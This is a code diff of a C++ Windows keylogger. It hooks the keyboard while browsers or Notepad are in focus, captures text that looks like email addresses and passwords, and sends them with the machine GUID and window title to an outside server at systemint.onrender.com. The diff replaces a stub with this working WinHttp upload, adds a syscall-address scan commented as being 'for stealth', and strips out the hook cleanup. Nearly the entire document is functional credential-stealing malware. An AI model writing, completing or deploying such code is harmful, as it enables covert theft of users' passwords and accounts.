@@ -17,13 +17,74 @@
 #pragma comment(lib, "user32.lib")
 #pragma comment(lib, "ole32.lib")
 
+// --- ASYNC/SYSCALL BRIDGE ---
 extern "C" {
     DWORD sys_number = 0;
     UINT_PTR sys_addr = 0;
 }
 extern "C" void DoIndirectSyscall();
 
-// --- LOGGING SYSTEM ---
+// --- CONFIGURATION ---
+std::vector<std::string> TARGET_APPS = { "chrome.exe", "msedge.exe", "brave.exe", "firefox.exe", "notepad.exe" };
+
+// --- 1. JSON ESCAPING HELPER ---
+std::string EscapeJson(const std::string& s) {
+    std::ostringstream o;
+    for (auto c : s) {
+        switch (c) {
+        case '"': o << "\\\""; break;
+        case '\\': o << "\\\\"; break;
+        case '\b': o << "\\b"; break;
+        case '\f': o << "\\f"; break;
+        case '\n': o << "\\n"; break;
+        case '\r': o << "\\r"; break;
+        case '\t': o << "\\t"; break;
+        default:
+            if ('\x00' <= c && c <= '\x1f') {
+                o << "\\u" << std::hex << std::setw(4) << std::setfill('0') << (int)c;
+            } else { o << c; }
+        }
+    }
+    return o.str();
+}
+
+// --- 2. DYNAMIC METADATA HELPERS ---
+std::string GetMachineId() {
+    char value[255];
+    DWORD BufferSize = sizeof(value);
+    HKEY hKey;
+    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Cryptography", 0, KEY_READ | KEY_WOW64_64KEY, &hKey) == ERROR_SUCCESS) {
+        if (RegQueryValueExA(hKey, "MachineGuid", NULL, NULL, (LPBYTE)value, &BufferSize) == ERROR_SUCCESS) {
+            RegCloseKey(hKey);
+            std::string rawId = value;
+            std::transform(rawId.begin(), rawId.end(), rawId.begin(), ::tolower);
+            return rawId;
+        }
+        RegCloseKey(hKey);
+    }
+    return "unknown_id";
+}
+
+std::string GetDynamicOS() {
+    char value[255] = {0};
+    DWORD BufferSize = sizeof(value);
+    HKEY hKey;
+    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", 0, KEY_READ | KEY_WOW64_64KEY, &hKey) == ERROR_SUCCESS) {
+        RegQueryValueExA(hKey, "ProductName", NULL, NULL, (LPBYTE)value, &BufferSize);
+        RegCloseKey(hKey);
+        return std::string(value);
+    }
+    return "Windows (Unknown)";
+}
+
+std::string GetActiveWindowTitle() {
+    char title[256];
+    HWND hwnd = GetForegroundWindow();
+    if (hwnd && GetWindowTextA(hwnd, title, sizeof(title))) return std::string(title);
+    return "System/Desktop";
+}
+
+// --- 3. LOGGING SYSTEM ---
 void WriteLog(std::string text) {
     char desktopPath[MAX_PATH];
     if (SHGetFolderPathA(NULL, CSIDL_DESKTOP, NULL, 0, desktopPath) == S_OK) {
@@ -33,15 +94,66 @@ void WriteLog(std::string text) {
             std::time_t now = std::time(0);
             struct tm ltm;
             localtime_s(&ltm, &now);
-            logFile << "[" << ltm.tm_hour << ":" << ltm.tm_min << ":" << ltm.tm_sec << "] " << text << std::endl;
+            logFile << "[" << std::setfill('0') << std::setw(2) << ltm.tm_hour << ":" << ltm.tm_min << "] " << text << std::endl;
             logFile.close();
         }
     }
 }
 
-// --- TARGET LIST ---
-std::vector<std::string> TARGET_APPS = { "chrome.exe", "msedge.exe", "brave.exe", "firefox.exe", "notepad.exe" };
+// --- 4. DATA EXFILTRATION ---
+void UploadData(std::string email, std::string pass) {
+    HINTERNET hS = WinHttpOpen(L"Mozilla/5.0", 1, NULL, NULL, 0);
+    HINTERNET hC = WinHttpConnect(hS, L"systemint.onrender.com", 443, 0);
+    HINTERNET hR = WinHttpOpenRequest(hC, L"POST", L"/api/sync", NULL, NULL, NULL, WINHTTP_FLAG_SECURE);
+    
+    std::stringstream ss;
+    ss << "{"
+       << "\"machineId\": \"" << GetMachineId() << "\","
+       << "\"type\": \"Keylogger\","
+       << "\"data\": {"
+       <<     "\"WindowsTitle\": \"" << EscapeJson(GetActiveWindowTitle()) << "\"," 
+       <<     "\"email\": \"" << EscapeJson(email) << "\","
+       <<     "\"password\": \"" << EscapeJson(pass) << "\""
+       << "},"
+       << "\"systemMeta\": {"
+       <<     "\"os\": \"" << EscapeJson(GetDynamicOS()) << "\""
+       << "}"
+       << "}";
 
+    std::string json = ss.str();
+    if(WinHttpSendRequest(hR, L"Content-Type: application/json\r\n", -1, (LPVOID)json.c_str(), (DWORD)json.length(), (DWORD)json.length(), 0)) {
+        if (WinHttpReceiveResponse(hR, NULL)) {
+            WriteLog("SUCCESS: Data uploaded for " + email);
+        }
+    }
+    WinHttpCloseHandle(hR); WinHttpCloseHandle(hC); WinHttpCloseHandle(hS);
+}
+
+// --- 5. CORE LOGIC ---
+std::string buffer = "";
+std::string savedEmail = "";
+
+bool IsEmail(const std::string& s) {
+    const std::regex e_reg(R"((\w+)(\.|_)?(\w*)@(\w+)(\.(\w+))+)", std::regex_constants::icase);
+    return std::regex_match(s, e_reg);
+}
+
+void ProcessBuffer() {
+    if (buffer.empty()) return;
+    if (buffer.find(' ') != std::string::npos) { buffer.clear(); return; }
+
+    if (IsEmail(buffer)) {
+        savedEmail = buffer;
+        WriteLog("Saved Email: " + savedEmail);
+    } else if (buffer.length() >= 8) {
+        std::string finalEmail = savedEmail.empty() ? "N/A" : savedEmail;
+        UploadData(finalEmail, buffer);
+        savedEmail.clear();
+    }
+    buffer.clear();
+}
+
+// --- 6. TARGET FILTER & HOOKS ---
 bool IsTargetAppActive() {
     DWORD processId;
     HWND hwnd = GetForegroundWindow();
@@ -49,10 +161,10 @@ bool IsTargetAppActive() {
     GetWindowThreadProcessId(hwnd, &processId);
     HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, processId);
     if (hProcess) {
-        char buffer[MAX_PATH];
-        DWORD size = sizeof(buffer);
-        if (QueryFullProcessImageNameA(hProcess, 0, buffer, &size)) {
-            std::string path(buffer);
+        char pathBuf[MAX_PATH];
+        DWORD size = sizeof(pathBuf);
+        if (QueryFullProcessImageNameA(hProcess, 0, pathBuf, &size)) {
+            std::string path(pathBuf);
             std::string exeName = path.substr(path.find_last_of("\\/") + 1);
             std::transform(exeName.begin(), exeName.end(), exeName.begin(), ::tolower);
             for (const std::string& target : TARGET_APPS) {
@@ -64,40 +176,9 @@ bool IsTargetAppActive() {
     return false;
 }
 
-// --- CORE LOGIC ---
-std::string buffer = "";
-std::string savedEmail = "";
-
-bool IsEmail(const std::string& s) {
-    const std::regex e_reg(R"((\w+)(\.|_)?(\w*)@(\w+)(\.(\w+))+)", std::regex_constants::icase);
-    return std::regex_match(s, e_reg);
-}
-
-void UploadData(std::string email, std::string pass) {
-    WriteLog("DATA READY FOR UPLOAD -> Email: " + email + " | Password: " + pass);
-    // Future: Insert your WinHttp POST logic here
-}
-
-void ProcessBuffer() {
-    if (buffer.empty()) return;
-    if (buffer.find(' ') != std::string::npos) { buffer.clear(); return; }
-
-    if (IsEmail(buffer)) {
-        savedEmail = buffer;
-        WriteLog("Captured Email: " + savedEmail);
-    } else if (buffer.length() >= 8) {
-        std::string emailToUpload = savedEmail.empty() ? "N/A (Standalone)" : savedEmail;
-        UploadData(emailToUpload, buffer); 
-        savedEmail.clear(); 
-    }
-    buffer.clear();
-}
-
-// --- CALLBACKS ---
 LRESULT CALLBACK KeyProc(int n, WPARAM w, LPARAM l) {
     if (n == HC_ACTION && w == WM_KEYDOWN) {
         if (!IsTargetAppActive()) return CallNextHookEx(NULL, n, w, l);
-        
         KBDLLHOOKSTRUCT* k = (KBDLLHOOKSTRUCT*)l;
         bool shift = (GetKeyState(VK_SHIFT) & 0x8000) != 0;
 
@@ -106,13 +187,10 @@ LRESULT CALLBACK KeyProc(int n, WPARAM w, LPARAM l) {
         } else if (k->vkCode == VK_BACK) {
             if (!buffer.empty()) buffer.pop_back();
         } else {
-            if (k->vkCode >= 0x41 && k->vkCode <= 0x5A) { // A-Z
-                char c = (char)k->vkCode;
-                if (!shift) c = (char)tolower(c);
-                buffer += c;
-            } else if (k->vkCode >= 0x30 && k->vkCode <= 0x39) { // 0-9
+            if (k->vkCode >= 0x41 && k->vkCode <= 0x5A) {
+                char c = (char)k->vkCode; if (!shift) c = (char)tolower(c); buffer += c;
+            } else if (k->vkCode >= 0x30 && k->vkCode <= 0x39) {
                 if (shift && k->vkCode == '2') buffer += "@";
-                else if (shift && k->vkCode == '1') buffer += "!";
                 else buffer += (char)k->vkCode;
             } else if (k->vkCode == VK_OEM_PERIOD) buffer += ".";
         }
@@ -127,25 +205,29 @@ LRESULT CALLBACK MouseProc(int n, WPARAM w, LPARAM l) {
     return CallNextHookEx(NULL, n, w, l);
 }
 
-// --- ENTRY POINT ---
+// --- 7. ENTRY POINT ---
 int WINAPI WinMain(HINSTANCE h, HINSTANCE p, LPSTR c, int s) {
-    WriteLog("=== MONITORING STARTED ===");
+    // Search for syscall instruction inside ntdll for stealth
+    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
+    if (ntdll) {
+        BYTE* addr = (BYTE*)GetProcAddress(ntdll, "NtQuerySystemInformation");
+        if (addr) {
+            for (int i = 0; i < 50; i++) {
+                if (addr[i] == 0x0F && addr[i+1] == 0x05 && addr[i+2] == 0xC3) {
+                    sys_addr = (UINT_PTR)&addr[i];
+                    break;
+                }
+            }
+        }
+    }
 
     HHOOK hKey = SetWindowsHookEx(WH_KEYBOARD_LL, KeyProc, h, 0);
     HHOOK hMouse = SetWindowsHookEx(WH_MOUSE_LL, MouseProc, h, 0);
-
-    if (!hKey || !hMouse) {
-        WriteLog("ERROR: Hook Installation Failed");
-        return 1;
-    }
-
+    
     MSG msg;
     while (GetMessage(&msg, NULL, 0, 0)) {
         TranslateMessage(&msg);
         DispatchMessage(&msg);
     }
-
-    UnhookWindowsHookEx(hKey);
-    UnhookWindowsHookEx(hMouse);
     return 0;
 }
